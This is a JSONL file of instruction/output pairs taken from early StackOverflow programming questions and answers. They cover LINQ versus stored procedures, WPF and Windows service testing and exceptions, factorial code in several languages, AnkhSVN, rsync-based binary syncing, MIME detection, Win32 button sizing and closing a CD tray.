{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "I think the pro LINQ argument seems to be coming from people who don't have a history with database development (in general).\nEspecially if using a product like VS DB Pro or Team Suite, many of the arguments made here do not apply, for instance:\nHarder to maintain and Test:\nVS provides full syntax checking, style checking, referential and constraint checking and more. It also provide full unit testing capabilities and refactoring tools.\nLINQ makes true unit testing impossible as (in my mind) it fails the ACID test.\nDebugging is easier in LINQ:\nWhy? VS allows full step-in from managed code and regular debugging of SPs.\nCompiled into a single DLL rather than deployment scripts:\nOnce again, VS comes to the rescue where it can build and deploy full databases or make data-safe incremental changes.\nDon't have to learn TSQL with LINQ:\nNo you don't, but you have to learn LINQ - where's the benefit?\n\nI really don't see this as being a benefit. Being able to change something in isolation might sound good in theory, but just because the changes fulfil a contract doesn't mean it's returning the correct results. To be able to determine what the correct results are you need context and you get that context from the calling code.\n\nUm, loosely coupled apps are the ultimate goal of all good programmers as they really do increase flexibility. Being able to change things in isolation is fantastic, and it is your unit tests that will ensure it is still returning appropriate results.\nBefore you all get upset, I think LINQ has its place and has a grand future. But for complex, data-intensive applications I do not think it is ready to take the place of stored procedures. This was a view I had echoed by an MVP at TechEd this year (they will remain nameless).\nEDIT: The LINQ to SQL Stored Procedure side of things is something I still need to read more on - depending on what I find I may alter my above diatribe ;)"}
{"instruction": "Do you know managed tools for manipulating PowerPoint files?\nThe tool should be 100% managed code and offer the option to\nhandle .ppt and .pptx files.", "output": "Well, 100% managed could be going the hard route, however, you can use the Office PIAs from your .NET code. Joel Spolsky has an article discussing your various options."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "I believe the bottom line argument against continue is that it makes it harder to PROVE that the code is correct. This is prove in the mathematical sense. But it probably doesn't matter to you because no one has the resources to 'prove' a computer program that is significantly complex. \nEnter the static-analysis tools. You may make things harder on them...\nAnd the goto, that sounds like a nightmare for the same reasons but at any random place in code."}
{"instruction": "Best practices recommend not installing Sql Server to run as SYSTEM.  What is the bare minumum you need to give the user account you create for it?", "output": "By default, SQL Server 2005 installation will create a security group called SQLServer2005MSSQLUser$ComputerName$MSSQLSERVER with the correct rights. You just need to create a domain user or local user and make it a member of that group. \nMore details are available in the SQL Server Books Online: Reviewing Windows NT Rights and Privileges Granted for SQL Server Service Accounts"}
{"instruction": "Do you know managed tools for manipulating PowerPoint files?\nThe tool should be 100% managed code and offer the option to\nhandle .ppt and .pptx files.", "output": "@Chris: There won't be a chance that Office 2007 will be available to manipulate the files. So far the only solution which comes close to what I am looking for is Aspose.Slides for .NET. The support for .pptx files is \"a work in progress\" though."}
{"instruction": "Using win forms with an MVC/MVP architecture, I would normally use a class to wrap a view to test the UI while using mocks for the model and controller/presenter.  The wrapper class would make most everything in the UI an observable property for the test runner through properties and events.\nWould this be a viable approach to testing a WPF app?  Is there a better way? Are there any gotchas to watch out for?", "output": "@Matt David,\nPlease read documentation and take a look at the code samples for Microsoft CompositeWPF (aka Prism). It's a project created specifically to teach how to deal with MVP/MVC architecture in test-driven manner. Their sample application contains unit tests for presenters\\controllers and very cool acceptance tests for UI (they use White framework to simulate user actions)"}
{"instruction": "Using win forms with an MVC/MVP architecture, I would normally use a class to wrap a view to test the UI while using mocks for the model and controller/presenter.  The wrapper class would make most everything in the UI an observable property for the test runner through properties and events.\nWould this be a viable approach to testing a WPF app?  Is there a better way? Are there any gotchas to watch out for?", "output": "It will work just fine, easier than with win forms.\nCheck \"WPF Application Quality Guide\", it has quite a bit on testing WPF interface.\nAlso don't forget AutomationPeer class."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Ruby: Iterative\ndef factorial(n)\n  (1 .. n).inject{|a, b| a*b}\nend\n\nRuby: Recursive\ndef factorial(n)\n  n == 1 ? 1 : n * factorial(n-1)\nend"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Nemerle: Functional\ndef fact(n) {\n    | 0 => 1\n    | x => x * fact(x-1)\n}"}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "I believe those two aren't equivalent... fit to square off against each other.\nCLR Integration is supposed to phase out \"extended stored procedures\" of yore. We have some of these in our workplace... essentially blocks of processing/logic over SQL data that was too hard/impossible to do via conventional DB Stored procedures/T SQL. So they wrote it up as extended stored procedures in C++ DLLs that can be invoked similarly. \nNow they have been phased out and CLR integration is the replacement\n\nDB Stored procedures: if it can be done in T SQL Stored procs, do it.\nCLR Stored procedures: if the logic is too complex or tedious to do via T SQL... if its something that will take fewer lines of CLR code to tackle it (string manipulation, complex/custom sorting or filtering, etc.) use this approach."}
{"instruction": "The following bit of code catches the EOS Exception\nusing (var reader = new BinaryReader(httpRequestBodyStream)) {\n\n    try {\n        while (true) {\n            bodyByteList.Add(reader.ReadByte());\n        }\n    } catch (EndOfStreamException) { }\n}\n\nSo why do I still receive first-chance exceptions in my console? \n\nA first chance exception of type 'System.IO.EndOfStreamException' occurred in mscorlib.dll\n\nIs there a way to hide these first chance exception messages?", "output": "I think the stream is throwing this exception, so your try is scoped to narrow to catch it.\nAdd a few more try catch combos around the different scopes until you catch it where its actually being thrown, but it appears to be happening either at our outside of your using, since the stream object is not created in the using's scope."}
{"instruction": "The following bit of code catches the EOS Exception\nusing (var reader = new BinaryReader(httpRequestBodyStream)) {\n\n    try {\n        while (true) {\n            bodyByteList.Add(reader.ReadByte());\n        }\n    } catch (EndOfStreamException) { }\n}\n\nSo why do I still receive first-chance exceptions in my console? \n\nA first chance exception of type 'System.IO.EndOfStreamException' occurred in mscorlib.dll\n\nIs there a way to hide these first chance exception messages?", "output": "The point of \"first-chance\" exceptions is that you're seeing them pre-handler so that you can stop on them during debugging at the point of throwing. A \"second-chance\" exception is one that has no appropriate handler. Sometimes you want to catch \"first-chance\" exceptions because it's important to see what's happening when it's being thrown, even if someone is catching it.\nThere's nothing to be concerned with. This is normal behavior."}
{"instruction": "Using win forms with an MVC/MVP architecture, I would normally use a class to wrap a view to test the UI while using mocks for the model and controller/presenter.  The wrapper class would make most everything in the UI an observable property for the test runner through properties and events.\nWould this be a viable approach to testing a WPF app?  Is there a better way? Are there any gotchas to watch out for?", "output": "Manually. I'm not a big fan of automated UI testing if that is what you're getting at. I'm not sure about the WPF guidances (need to read thru aku's links).. because they are still solidifying so to speak... WPF has not stabilized from the point of 'what is the right way'. Unless you're using one of these evolving frameworks.. I'd be conservative w.r.t. effort\n\nTest (Automated preferably TDDed) the logic/presenters/controllers ruthlessly. I'm not advocating sloppiness or lethargy.  \nKeep the UI skin thin and get some nasty testers to go have a (manual) crack at it with exploratory testing - nothing is as good as a 'tester from Hell' when it comes to UIs. The effort : gain ratio from automating this kind of testing is huge, doesn't catch everything and doesn't make sense... except to pacify the higher ups 'Look Mgr! No hands! self-testing UIs!'\n\nPS: you may want to watch this (Mary Poppendieck's Google Talk on Lean).. especially the part about what to automate in testing"}
{"instruction": "The following bit of code catches the EOS Exception\nusing (var reader = new BinaryReader(httpRequestBodyStream)) {\n\n    try {\n        while (true) {\n            bodyByteList.Add(reader.ReadByte());\n        }\n    } catch (EndOfStreamException) { }\n}\n\nSo why do I still receive first-chance exceptions in my console? \n\nA first chance exception of type 'System.IO.EndOfStreamException' occurred in mscorlib.dll\n\nIs there a way to hide these first chance exception messages?", "output": "1) In Visual Studio you can change the settings for the way the Debugger handles (breaks on) exceptions.\nGo to Debug > Exceptions. (Note this may not be in your menu depending on your Visual Studio Environment setting. If not just add it to your menu using the Customize menu.)\nThere you are presented with a dialog of exceptions and when to break on them.\nIn the line \"Common Language Runtime Exceptions\" you can deselect thrown (which should then stop bothering you about first-chance exceptions) and you can also deselect User-unhandeled (which I would not recommend) if want to.\n2) The message you are getting should not be in the console, but should be appearing in the 'Output' window of Visual Studio. If the latter is the case, then I have not found a possibility to remove that, but it doesn't appear if you run the app without Visual Studio.\nHope that helps."}
{"instruction": "Is it possible to use an UnhandledException Handler in a Windows Service?\nNormally I would use a custom built Exception Handling Component that does logging, phone home, etc. This component adds a handler to System.AppDomain.CurrentDomain.UnhandledException but as far as I can tell this doesn\u2019t achieve anything win a Windows Service so I end up with this pattern in my 2 (or 4) Service entry points:\n\n\n    Protected Overrides Sub OnStart(ByVal args() As String)\n        ' Add code here to start your service. This method should set things\n        ' in motion so your service can do its work.\n        Try\n            MyServiceComponent.Start()\n        Catch ex As Exception\n            'call into our exception handler\n            MyExceptionHandlingComponent.ManuallyHandleException (ex)\n            'zero is the default ExitCode for a successfull exit, so if we set it to non-zero\n            ExitCode = -1\n            'So, we use Environment.Exit, it seems to be the most appropriate thing to use\n            'we pass an exit code here as well, just in case.\n            System.Environment.Exit(-1)\n        End Try\n    End Sub\n\n\nIs there a way my Custom Exception Handling component can deal with this better so I don't have to fill my OnStart with messy exception handling plumbing?", "output": "You can subscribe to the AppDomain.UnhandledException event.  If you have a message loop, you can tie to the Application.ThreadException event."}
{"instruction": "The following bit of code catches the EOS Exception\nusing (var reader = new BinaryReader(httpRequestBodyStream)) {\n\n    try {\n        while (true) {\n            bodyByteList.Add(reader.ReadByte());\n        }\n    } catch (EndOfStreamException) { }\n}\n\nSo why do I still receive first-chance exceptions in my console? \n\nA first chance exception of type 'System.IO.EndOfStreamException' occurred in mscorlib.dll\n\nIs there a way to hide these first chance exception messages?", "output": "Unlike Java, .NET exceptions are fairly expensive in terms of processing power, and handled exceptions should be avoided in the normal and successful execution path.\nNot only will you avoid clutter in the console window, but your performance will improve, and it will make performance counters like .NET CLR Exceptions more meaningful.\nIn this example you would use\nwhile (reader.PeekChar() != -1)\n{\n    bodyByteList.Add(reader.ReadByte());\n}"}
{"instruction": "Given a path such as \"mydir/myfile.txt\", how do I find the absolute filepath relative to the current working directory in Python? E.g. on Windows, I might end up with:\n\"C:/example/cwd/mydir/myfile.txt\"", "output": "Better still, install the path.py module, it wraps all the os.path functions and other related functions into methods on an object that can be used wherever strings are used:\n>>> from path import path\n>>> path('mydir/myfile.txt').abspath()\n'C:\\\\example\\\\cwd\\\\mydir\\\\myfile.txt'\n>>>"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "#Language: T-SQL\n#Style: Recursive, divide and conquer\n\nJust for fun - in T-SQL using a divide and conquer recursive method. Yes, recursive - in SQL without stack overflow.\ncreate function factorial(@b int=1, @e int) returns float as begin\n  return case when @b>=@e then @e else \n      convert(float,dbo.factorial(@b,convert(int,@b+(@e-@b)/2)))\n    * convert(float,dbo.factorial(convert(int,@b+1+(@e-@b)/2),@e)) end\nend\n\ncall it like this:\nprint dbo.factorial(1,170) -- the 1 being the starting number"}
{"instruction": "Is it possible to use an UnhandledException Handler in a Windows Service?\nNormally I would use a custom built Exception Handling Component that does logging, phone home, etc. This component adds a handler to System.AppDomain.CurrentDomain.UnhandledException but as far as I can tell this doesn\u2019t achieve anything win a Windows Service so I end up with this pattern in my 2 (or 4) Service entry points:\n\n\n    Protected Overrides Sub OnStart(ByVal args() As String)\n        ' Add code here to start your service. This method should set things\n        ' in motion so your service can do its work.\n        Try\n            MyServiceComponent.Start()\n        Catch ex As Exception\n            'call into our exception handler\n            MyExceptionHandlingComponent.ManuallyHandleException (ex)\n            'zero is the default ExitCode for a successfull exit, so if we set it to non-zero\n            ExitCode = -1\n            'So, we use Environment.Exit, it seems to be the most appropriate thing to use\n            'we pass an exit code here as well, just in case.\n            System.Environment.Exit(-1)\n        End Try\n    End Sub\n\n\nIs there a way my Custom Exception Handling component can deal with this better so I don't have to fill my OnStart with messy exception handling plumbing?", "output": "Ok, I\u2019ve done  a little more research into this now.\nWhen you create a windows service in .Net, you create a class that inherits from System.ServiceProcess.ServiceBase (In VB this is hidden in the .Designer.vb file). You then override the OnStart and OnStop function, and OnPause and OnContinue if you choose to. \nThese methods are invoked from within the base class so I did a little poking around with reflector.\nOnStart is invoked by a method in System.ServiceProcess.ServiceBase called ServiceQueuedMainCallback.  The vesion on my machine \"System.ServiceProcess, Version=2.0.0.0\" decompiles like this:\n\n\nPrivate Sub ServiceQueuedMainCallback(ByVal state As Object)\n    Dim args As String() = DirectCast(state, String())\n    Try \n        Me.OnStart(args)\n        Me.WriteEventLogEntry(Res.GetString(\"StartSuccessful\"))\n        Me.status.checkPoint = 0\n        Me.status.waitHint = 0\n        Me.status.currentState = 4\n    Catch exception As Exception\n        Me.WriteEventLogEntry(Res.GetString(\"StartFailed\", New Object() { exception.ToString }), EventLogEntryType.Error)\n        Me.status.currentState = 1\n    Catch obj1 As Object\n        Me.WriteEventLogEntry(Res.GetString(\"StartFailed\", New Object() { String.Empty }), EventLogEntryType.Error)\n        Me.status.currentState = 1\n    End Try\n    Me.startCompletedSignal.Set\nEnd Sub\n\n\nSo because Me.OnStart(args) is called from within the Try portion of a Try Catch block I assume that anything that happens within the OnStart method is effectively wrapped by that Try Catch block and therefore any exceptions that occur aren't technically unhandled as they are actually handled in the ServiceQueuedMainCallback Try Catch. So CurrentDomain.UnhandledException never actually happens at least during the startup routine. \nThe other 3 entry points (OnStop, OnPause and OnContinue) are all called from the base class in a similar way.\nSo I \u2018think\u2019 that explains why my Exception Handling component can\u2019t catch UnhandledException on Start and Stop, but I\u2019m not sure if it explains why timers that are setup in OnStart can\u2019t cause an UnhandledException when they fire."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "@mcintyre321\n\nI've found that both SVN tools have at times failed to keep up with my file/folder renaming and moving resulting in it thinking that a perfectly good file needs to be deleted on the next commit.\n\nA move or rename operation results in an delete and 'add with history' at subversion level.\nTortoiseSvn shows this as:\noriginalFile   deleted\nnewFile        added (+)"}
{"instruction": "We need to regularly synchronize many dozens of binary files (project executables and DLLs) between many developers at several different locations, so that every developer has an up to date environment to build and test at. Due to nature of the project, updates must be done often and on-demand (overnight updates are not sufficient). This is not pretty, but we are stuck with it for a time.\nWe settled on using a regular version (source) control system: put everything into it as binary files, get-latest before testing and check-in updated DLL after testing.\nIt works fine, but a version control client has a lot of features which don't make sense for us and people occasionally get confused.\nAre there any tools better suited for the task? Or may be a completely different approach?\nUpdate: I need to clarify that it's not a tightly integrated project - more like extensible system with a heap of \"plugins\", including thrid-party ones. We need to make sure those modules-plugins works nicely with recent versions of each other and the core. Centralised build as was suggested was considered initially, but it's not an option.", "output": "You should look into continuous integration and having some kind of centralised build process. I can only imagine the kind of hell you're going through with your current approach.\nObviously that doesn't help with the keeping your local files in sync, but I think you have bigger problems with your process."}
{"instruction": "We need to regularly synchronize many dozens of binary files (project executables and DLLs) between many developers at several different locations, so that every developer has an up to date environment to build and test at. Due to nature of the project, updates must be done often and on-demand (overnight updates are not sufficient). This is not pretty, but we are stuck with it for a time.\nWe settled on using a regular version (source) control system: put everything into it as binary files, get-latest before testing and check-in updated DLL after testing.\nIt works fine, but a version control client has a lot of features which don't make sense for us and people occasionally get confused.\nAre there any tools better suited for the task? Or may be a completely different approach?\nUpdate: I need to clarify that it's not a tightly integrated project - more like extensible system with a heap of \"plugins\", including thrid-party ones. We need to make sure those modules-plugins works nicely with recent versions of each other and the core. Centralised build as was suggested was considered initially, but it's not an option.", "output": "I'd probably take a look at rsync.\nJust create a .CMD file that contains the call to rsync with all the correct parameters and let people call that. rsync is very smart in deciding what part of files need to be transferred, so it'll be very fast even when large files are involved.\nWhat rsync doesn't do though is conflict resolution (or even detection), but in the scenario you described it's more like reading from a central place which is what rsync is designed to handle."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "Earlier on (like 2 years ago when I last tried), AnkhSVN and Tortoise used in parallel with the same working copy caused some kind of working copy corruption where Ankh and Tortoise somehow lost track of the state the other tool left the working copy in.\nIt was as if one of the tools stored additional metadata not contained in the working copy and was reliant on that being correct.\nThe problems showed themselves by Ankh (or Tortoise) insisting on files being there which weren't, on files being changed which weren't and on files not being changed which were (and thus unable to commit).\nMaybe this has been fixed since, but I thought I'd better warn you guys."}
{"instruction": "I am looking for a simple way to get a mime type where the file extension is incorrect or not given, something similar to this question only in .Net.", "output": "In Urlmon.dll, there's a function called FindMimeFromData.\nFrom the documentation \n\nMIME type detection, or \"data sniffing,\" refers to the process of determining an appropriate MIME type from binary data. The final result depends on a combination of server-supplied MIME type headers, file extension, and/or the data itself. Usually, only the first 256 bytes of data are significant. \n\nSo, read the first (up to) 256 bytes from the file and pass it to FindMimeFromData."}
{"instruction": "We need to regularly synchronize many dozens of binary files (project executables and DLLs) between many developers at several different locations, so that every developer has an up to date environment to build and test at. Due to nature of the project, updates must be done often and on-demand (overnight updates are not sufficient). This is not pretty, but we are stuck with it for a time.\nWe settled on using a regular version (source) control system: put everything into it as binary files, get-latest before testing and check-in updated DLL after testing.\nIt works fine, but a version control client has a lot of features which don't make sense for us and people occasionally get confused.\nAre there any tools better suited for the task? Or may be a completely different approach?\nUpdate: I need to clarify that it's not a tightly integrated project - more like extensible system with a heap of \"plugins\", including thrid-party ones. We need to make sure those modules-plugins works nicely with recent versions of each other and the core. Centralised build as was suggested was considered initially, but it's not an option.", "output": "Building the project should be a centralized process in order to allow for better control soon your solution will be caos in the long run. Anyway here is what I'd do.\n\nCreate the usual repositories for\nsource files, resources,\ndocumentation, etc for each project.\nCreate a repository for resources.\nThere will be the latest binary\nversions for each project as well as\nany required resources, files, etc.\nKeep a good folder structure for\neach project so developers can\n\"reference\" the files directly.\nCreate a repository for final buidls\nwhich will hold the actual stable\nrelease. This will get the stable\nfiles, done in an automatic way (if\npossible) from the checked in\nsources. This will hold the real\nproduct, the real version for\nintegration testing and so on.\n\nWhile far from being perfect you'll be able to define well established protocols. Check in your latest dll here, generate the \"real\" versi\u00f3n from latest source here."}
{"instruction": "We need to regularly synchronize many dozens of binary files (project executables and DLLs) between many developers at several different locations, so that every developer has an up to date environment to build and test at. Due to nature of the project, updates must be done often and on-demand (overnight updates are not sufficient). This is not pretty, but we are stuck with it for a time.\nWe settled on using a regular version (source) control system: put everything into it as binary files, get-latest before testing and check-in updated DLL after testing.\nIt works fine, but a version control client has a lot of features which don't make sense for us and people occasionally get confused.\nAre there any tools better suited for the task? Or may be a completely different approach?\nUpdate: I need to clarify that it's not a tightly integrated project - more like extensible system with a heap of \"plugins\", including thrid-party ones. We need to make sure those modules-plugins works nicely with recent versions of each other and the core. Centralised build as was suggested was considered initially, but it's not an option.", "output": "What about embedding a 'what' string in the executables and libraries. Then you can synchronise the desired list of versions with a manifest.\nWe tend to use CVS id strings as a part of the what string.\nconst char cvsid[] = \"@(#)INETOPS_filter_ip_$Revision: 1.9 $\";\nEntering the command\nwhat filter_ip | grep INETOPS\nreturns\nINETOPS_filter_ip_$Revision: 1.9 $\nWe do this for all deliverables so we can see if the versions in a bundle of libraries and executables match the list in a associated manifest.\nHTH.\ncheers,\nRob"}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "About a year ago me and a buddy used AnkhSVN for a project... several commits later while moving namespaces around, it broke the SVN repository. Broke as in, the last commit we did got corrupted, and we couldn't commit anymore.\nAfter that we used TortoiseSVN and did the namespace moving manually, it just... worked. If you're only working on base class libraries you could always try using SharpDevelop instead (that integrates with TortoiseSVN).\nI do hope they did fix AnkhSVN now though because IDE integrations always rock... when they work."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "#Language: T-SQL\n#Style: Big Numbers\n\nHere's another T-SQL solution -- supports big numbers in a most Rube Goldbergian manner. Lots of set-based ops. Tried to keep it uniquely SQL. Horrible performance (400! took 33 seconds on a Dell Latitude D830)\ncreate function bigfact(@x varchar(max)) returns varchar(max) as begin\n  declare @c int\n  declare @n table(n int,e int)\n  declare @f table(n int,e int)\n\n  set @c=0\n  while @c<len(@x) begin\n    set @c=@c+1\n    insert @n(n,e) values(convert(int,substring(@x,@c,1)),len(@x)-@c)\n  end\n\n  -- our current factorial\n  insert @f(n,e) select 1,0\n\n  while 1=1 begin\n    declare @p table(n int,e int)\n    delete @p\n    -- product\n    insert @p(n,e) select sum(f.n*n.n), f.e+n.e from @f f cross join @n n group by f.e+n.e\n\n    -- normalize\n    while 1=1 begin\n      delete @f\n      insert @f(n,e) select sum(n),e from (\n        select (n % 10) as n,e from @p union all \n        select (n/10) % 10,e+1 from @p union all \n        select (n/100) %10,e+2 from @p union all \n        select (n/1000)%10,e+3 from @p union all \n        select (n/10000) % 10,e+4 from @p union all \n        select (n/100000)% 10,e+5 from @p union all \n        select (n/1000000)%10,e+6 from @p union all \n        select (n/10000000) % 10,e+7 from @p union all \n        select (n/100000000)% 10,e+8 from @p union all \n        select (n/1000000000)%10,e+9 from @p\n      ) f group by e having sum(n)>0\n\n      set @c=0\n      select @c=count(*) from @f where n>9\n      if @c=0 break\n      delete @p\n      insert @p(n,e) select n,e from @f\n    end\n\n    -- decrement\n    update @n set n=n-1 where e=0\n\n    -- normalize\n    while 1=1 begin\n      declare @e table(e int)\n      delete @e\n      insert @e(e) select e from @n where n<0\n      if @@rowcount=0 break\n\n      update @n set n=n+10 where e in (select e from @e)\n      update @n set n=n-1 where e in (select e+1 from @e)\n    end  \n\n    set @c=0\n    select @c=count(*) from @n where n>0\n    if @c=0 break\n  end\n\n  select @c=max(e) from @f\n  set @x=''\n  declare @l varchar(max)\n  while @c>=0 begin\n    set @l='0'\n    select @l=convert(varchar(max),n) from @f where e=@c\n    set @x=@x+@l\n    set @c=@c-1\n  end\n  return @x\nend\n\nExample:\nprint dbo.bigfact('69')\n\nreturns:\n171122452428141311372468338881272839092270544893520369393648040923257279754140647424000000000000000"}
{"instruction": "How do I create a button control (with CreateWindow of a BUTTON window class) that has a standard system-wide size (especially height) that's consistent with the rest of Windows applications?\nI should of course take DPI into account and probably other settings.\n\nRemark: Using USE_CW_DEFAULT for width and height results in a 0, 0 size button, so that's not a solution.", "output": "This is what MSDN has to say: Design Specifications and Guidelines - Visual Design: Layout.\nThe default size of a button is 50x14 DLUs, which can be calculated to pixels using the examples shown for GetDialogBaseUnits.\nThe MapDialogRect function seems to do the calculation for you."}
{"instruction": "I asked a couple of coworkers about AnkhSVN and neither one of them was happy with it. One of them went as far as saying that AnkhSVN has messed up his devenv several times.\nWhat's your experience with AnkhSVN? I really miss having an IDE integrated source control tool.", "output": "I had no problems with v1, but I was warned not to use it. I've been using v2 for a while, and I've had no problems with it. I still keep a backup of the repository though..."}
{"instruction": "I have written some code in my VB.NET application to send an HTML e-mail (in this case, a lost password reminder).\nWhen I test the e-mail, it gets eaten by my spam filter.  One of the things that it's scoring badly on is because of the following problem:\nMIME_QP_LONG_LINE  RAW: Quoted-printable line longer than 76 chars\nI've been through the source of the e-mail, and I've broken each line longer than 76 characters into two lines with a CR+LF in between, but that hasn't fixed the problem.\nCan anyone point me in the right direction?\nThanks!", "output": "Quoted printable expands 8 bit characters to \"={HEX-Code}\", thus making the messages longer. Maybe you are just hitting this limit?\nHave you tried to break the message at, say, 70 characters? That should provide space for a couple of characters per line.\nOr you just encode the email with Base64 - all mail client can handle that.\nOr you just set Content-Transfer-Encoding to 8bit and send the data unencoded. I know of no mail server unable to handle 8bit bytes these days."}
{"instruction": "Does anyone know a method to programmatically close the CD tray on Windows 2000 or higher?\nOpen CD tray exists, but I can't seem to make it close especially under W2k. \nI am especially looking for a method to do this from a batch file, if possible, but API calls would be OK.", "output": "Nircmd is a very handy freeware command line utility with various options, including opening and closing the CD tray."}
{"instruction": "How do I create a button control (with CreateWindow of a BUTTON window class) that has a standard system-wide size (especially height) that's consistent with the rest of Windows applications?\nI should of course take DPI into account and probably other settings.\n\nRemark: Using USE_CW_DEFAULT for width and height results in a 0, 0 size button, so that's not a solution.", "output": "In the perfect, hassle-free world...\nTo create a standard size button we would have to do this:\nLONG units = GetDialogBaseUnits();\nm_hButton = CreateWindow(TEXT(\"BUTTON\"), TEXT(\"Close\"), \n                 WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, \n                 0, 0, MulDiv(LOWORD(units), 50, 4), MulDiv(HIWORD(units), 14, 8),\n                 hwnd, NULL, hInst, NULL);\n\nwhere 50 and 14 are respective DLU dimensions, 4 and 8 are horizontal and vertical dialog template units respectively, based on GetDialogBaseUnits() function documentation remarks.\n\nNothing's perfect\nBUT as Anders pointed out, those metrics are based on the system font. If your window uses a shell dialog font or simply anything not making your eyes bleed, you're pretty much on your own.\nTo get your own \"dialog\" base units, you have to retrieve current text metrics with GetTextMetrics() and use character height and average width (tmHeight and tmAveCharWidth of the TEXTMETRIC struct respectively) and translate them with MulDiv by your own, unless you are in a dialog, then MapDialogRect() will do all the job for you.\nNote that tmAveCharWidth only approximates the actual average character width so it's recommended to use a GetTextExtentPoint32() function on an alphabetic character set instead.\nSee:\n\nHow to calculate dialog box units based on the current font in Visual C++\nHow To Calculate Dialog Base Units with Non-System-Based Font\n\n\nSimpler alternative\nIf buttons are the only control you want to resize automatically, you can also use BCM_GETIDEALSIZE message Button_GetIdealSize() macro (Windows XP and up only) to retrieve optimal width and height that fits anything the button contains, though it looks pretty ugly without any margins applied around the button's text."}
{"instruction": "Does anyone know a method to programmatically close the CD tray on Windows 2000 or higher?\nOpen CD tray exists, but I can't seem to make it close especially under W2k. \nI am especially looking for a method to do this from a batch file, if possible, but API calls would be OK.", "output": "Here is an easy way using the Win32 API:\n\n[DllImport(\"winmm.dll\", EntryPoint = \"mciSendStringA\", CharSet = CharSet.Ansi)]\n        protected static extern int mciSendString(string lpstrCommand,StringBuilder lpstrReturnString,int uReturnLength,IntPtr hwndCallback);\n\n public void OpenCloseCD(bool Open)\n {\n    if (Open)\n    {\n        mciSendString(\"set cdaudio door open\", null, 0, IntPtr.Zero);\n    }\n    else\n    {\n        mciSendString(\"set cdaudio door closed\", null, 0, IntPtr.Zero);\n    }\n}"}
